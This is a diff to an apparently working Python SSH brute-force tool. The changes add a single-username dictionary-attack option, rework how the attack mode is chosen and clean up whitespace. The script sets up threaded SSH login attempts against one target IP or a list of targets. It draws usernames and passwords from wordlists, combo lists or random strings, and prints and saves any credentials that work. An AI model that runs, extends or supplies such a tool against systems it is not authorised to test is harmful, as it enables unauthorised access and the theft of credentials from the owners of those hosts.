@@ -31,51 +31,51 @@ class SSHBruteForce():
         self.bruteForceAttempts = 0
         self.bruteForceMode = False
         self.characters = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        
+
     def startUp(self):
         usage = '%s [-i targetIp] [-U usernamesFile] [-P passwordsFile]' % sys.argv[0]
-        
+
         optionParser = OptionParser(version = self.info, usage = usage)
 
-        optionParser.add_option('-i',  dest = 'targetIp',              
-                                help = 'Ip to attack')  
-        optionParser.add_option('-p',  dest = 'targetPort',            
+        optionParser.add_option('-i',  dest = 'targetIp',
+                                help = 'Ip to attack')
+        optionParser.add_option('-p',  dest = 'targetPort',
                                 help = 'Ip port to attack', default = 22)
-        optionParser.add_option('-d', dest='typeOfAttack',
-                                help = 'Dictionary Attack', default = False)
         optionParser.add_option('-a', dest='attemptAmount',
                                 help = "Number of attempts before stopping", default = 2)
         optionParser.add_option('-l', dest='lengthLimit',
                                 help = 'Length of bruteforce strings', default = 8)
         optionParser.add_option('-I',  dest = 'targetsFile',
                                 help = 'List of IP\'s and ports')
-        optionParser.add_option('-C',  dest = 'combolistFile',              
+        optionParser.add_option('-C',  dest = 'combolistFile',
                                 help = 'Combo List file')
-        optionParser.add_option('-U',  dest = 'usernamesFile',              
-                                help = 'Username List file')  
-        optionParser.add_option('-P',  dest = 'passwordsFile',          
+        optionParser.add_option('-U',  dest = 'usernamesFile',
+                                help = 'Username List file')
+        optionParser.add_option('-u',  dest = 'username',
+                                help = 'Single username for dictionary attack')
+        optionParser.add_option('-P',  dest = 'passwordsFile',
                                 help = 'Password List file')
-        optionParser.add_option('-t',  type = 'int', dest = 'threads', 
+        optionParser.add_option('-t',  type = 'int', dest = 'threads',
                                 help = 'Amount of Threads', default = 10)
-        optionParser.add_option('-T',  type = 'int', dest = 'timeout', 
+        optionParser.add_option('-T',  type = 'int', dest = 'timeout',
                                 help = 'Timeout Time', default = 15)
         optionParser.add_option('-O', dest = "outputFile",
                                 help = 'Output File Name', default = None)
-        optionParser.add_option('-v',  '--verbose', action='store_true', 
+        optionParser.add_option('-v',  '--verbose', action='store_true',
                                 dest='verbose', help='verbose')
 
         (options, args) = optionParser.parse_args()
 
         #First a check is used to see if there is at least a singleIp set or a targetList set
-        if not options.targetIp and not options.targetsFile:            
+        if not options.targetIp and not options.targetsFile:
             optionParser.print_help()
             sys.exit(1)
-            
+
         else:
             #Check to see if we are running a dictionary attack or a bruteforce
-            if bool(options.typeOfAttack) == True:
-                #Then another check to make sure the Username list and passwordlist are filled
-                if (options.usernamesFile and options.passwordsFile) or options.combolistFile:
+            if (options.username or options.usernamesFile) and options.passwordsFile:
+                #Then another check to make sure the username or username list and passwordlist are filled
+                if ((options.username or options.usernamesFile) and options.passwordsFile) or options.combolistFile:
                     #Then we check if it is a single ip only
                     if options.targetIp and not options.targetsFile:
                         self.singleMode = True
@@ -110,18 +110,24 @@ class SSHBruteForce():
         self.verbose = options.verbose
         self.bruteForceLength = options.lengthLimit
         self.bruteForceAttempts = options.attemptAmount
-        
-        if bool(options.typeOfAttack):           
+
+        # if not bruteForceMode, it is dictionaryAttackMode
+        if not self.bruteForceMode:
             if options.combolistFile:
                 self.usernames, self.passwords = self.__seperateDataFromComboList(options.combolistFile)
             else:
-                self.usernames = Util.fileContentsToList(options.usernamesFile)
+                # if username is provided, set it, otherwise get from username file
+                if options.username:
+                    self.usernames = []
+                    self.usernames.append(options.username)
+                else:
+                    self.usernames = Util.fileContentsToList(options.usernamesFile)
                 self.passwords = Util.fileContentsToList(options.passwordsFile)
             self.showStartInfo()
             self.dictionaryAttackSingle()
         else:
-            self.bruteForceSingle();
             self.showStartInfo()
+            self.bruteForceSingle();
 
     def multipleTargets(self,options):
         self.targets = Util.fileContentsToTuple(options.targetsFile)
@@ -132,18 +138,23 @@ class SSHBruteForce():
         self.bruteForceLength = options.lengthLimit
         self.bruteForceAttempts = options.attemptAmount
 
-        if bool(options.typeOfAttack):
+        if not self.bruteForceMode:
             if options.combolistFile:
                 self.usernames, self.passwords = self.__seperateDataFromComboList(options.combolistFile)
             else:
-                self.usernames = Util.fileContentsToList(options.usernamesFile)
+                # if username is provided, set it, otherwise get from username file
+                if options.username:
+                    self.usernames = []
+                    self.usernames.append(options.username)
+                else:
+                    self.usernames = Util.fileContentsToList(options.usernamesFile)
                 self.passwords = Util.fileContentsToList(options.passwordsFile)
             self.showStartInfo()
             self.dictionaryAttackMultiple()
         else:
             self.bruteForceMultiple()
             self.showStartInfo()
-    
+
     @staticmethod
     def __seperateDataFromComboList(comboListFile):
         usernames = []
@@ -162,10 +173,11 @@ class SSHBruteForce():
             print "[*] Loaded %s Targets " % str(len(self.targets))
 
         if self.bruteForceMode == False:
+            print "[*] Brute Force Starting [dictionary attack mode]"
             print "[*] Loaded %s Usernames "   % str(len(self.usernames))
             print "[*] Loaded %s Passwords "   % str(len(self.passwords))
-        print "[*] Brute Force Starting "
-        
+        print "[*] Brute Force Starting [BF attack mode]"
+
         if self.outputFileName is not None:
             Util.appendLineToFile("%s " % self.info, self.outputFileName)
             if self.singleMode:
@@ -180,22 +192,22 @@ class SSHBruteForce():
         for username in self.usernames:
             for password in self.passwords:
 
-                self.createConnection(username, password, self.targetIp, 
+                self.createConnection(username, password, self.targetIp,
                                       self.targetPort, self.timeoutTime)
                 if self.currentThreadCount == self.amountOfThreads:
                     self.currentThreadResults()
 		self.currentThreadResults()
-                    
+
     def dictionaryAttackMultiple(self):
         for target in self.targets:
             for username in self.usernames:
                 for password in self.passwords:
-                    self.createConnection(username, password, target[0], 
+                    self.createConnection(username, password, target[0],
                                           int(target[1]), self.timeoutTime)
                     if self.currentThreadCount == self.amountOfThreads:
                         self.currentThreadResults()
 		self.currentThreadResults()
-        
+
     def bruteForceSingle(self):
         for x in range(int(self.bruteForceAttempts)):
             randomUserString = ""
@@ -203,13 +215,13 @@ class SSHBruteForce():
             randomStringLength = random.randint(4,int(self.bruteForceLength))
             for y in range(randomStringLength):
                 randomUserString = randomUserString+random.choice(self.characters)
-            
+
             randomStringLength = random.randint(4,int(self.bruteForceLength))
-            
+
             for z in range(randomStringLength):
                 randomPasswordString = randomPasswordString + random.choice(self.characters)
-            
-            self.createConnection(randomUserString, randomPasswordString, self.targetIp, 
+
+            self.createConnection(randomUserString, randomPasswordString, self.targetIp,
                 self.targetPort, self.timeoutTime)
             if self.currentThreadCount == self.amountOfThreads:
                 self.currentThreadResults()
@@ -221,16 +233,16 @@ class SSHBruteForce():
                 randomUserString = ""
                 randomPasswordString = ""
                 randomStringLength = random.randint(4,self.bruteForceLength)
-                
+
                 for y in range(randomStringLength):
                     randomUserString = randomUserString+random.choice(self.characters)
-                
+
                 randomStringLength = random.randint(4,self.bruteForceLength)
-                
+
                 for z in range(randomStringLength):
                     randomPasswordString = randomPasswordString + random.choice(self.characters)
 
-                self.createConnection(randomUserString, randomPasswordString, target, 
+                self.createConnection(randomUserString, randomPasswordString, target,
                     self.targetPort, self.timeoutTime)
                 if self.currentThreadCount == self.amountOfThreads:
                     self.currentThreadResults()
@@ -245,7 +257,7 @@ class SSHBruteForce():
         self.currentThreadCount += 1
         if self.verbose:
             print "[*] Adding Target: {0}, Testing with username: {1}, testing with password: {2}" .format(targetIp, username, password)
-        
+
     def currentThreadResults(self):
         for connection in self.connections:
             connection.join()
@@ -254,27 +266,27 @@ class SSHBruteForce():
                 print "[#] TargetIp: %s " % connection.targetIp
                 print "[#] Username: %s " % connection.username
                 print "[#] Password: %s " % connection.password
-                
+
                 if self.outputFileName is not None:
                     Util.appendLineToFile("TargetIp: %s " % connection.targetIp, self.outputFileName)
                     Util.appendLineToFile("Username: %s " % connection.username, self.outputFileName)
                     Util.appendLineToFile("Password: %s " % connection.password, self.outputFileName)
-                    
+
                 if self.singleMode:
                     self.completed()
             else:
                 pass
-    
+
         self.clearOldThreads()
 
     def clearOldThreads(self):
         self.connections = []
         self.threadCount = 0
-    
+
     def completed(self):
         print "[*] Completed Brute Force."
         sys.exit(0)
-        
+
 if __name__ == '__main__':
     sshBruteForce = SSHBruteForce()
     sshBruteForce.startUp()
